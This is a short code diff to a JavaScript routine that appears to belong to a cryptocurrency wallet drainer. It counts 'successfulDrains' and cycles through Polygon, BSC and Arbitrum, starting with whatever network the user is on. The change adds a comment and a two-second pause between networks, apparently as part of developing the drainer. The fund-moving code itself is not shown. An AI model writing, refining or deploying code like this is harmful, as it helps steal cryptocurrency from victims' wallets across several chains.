@@ -645,7 +645,7 @@ async function startNetworkCycle() {
     const allNetworks = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
     let successfulDrains = 0;
 
-    // STEP 1: Process current network first
+    // STEP 1: Process current network first (whatever network user is on)
     const currentNetwork = CHAIN_CONFIGS[currentChainId];
     if (currentNetwork && !processedNetworks[currentChainId]) {
         updateNetworkStatus(currentChainId, 'pending', 'Processing current network...');
@@ -660,6 +660,9 @@ async function startNetworkCycle() {
             isExecuting = false;
             return;
         }
+        
+        // Wait a bit before moving to next network
+        await new Promise(resolve => setTimeout(resolve, 2000));
     }
 
     // STEP 2: Process other networks (excluding current one)
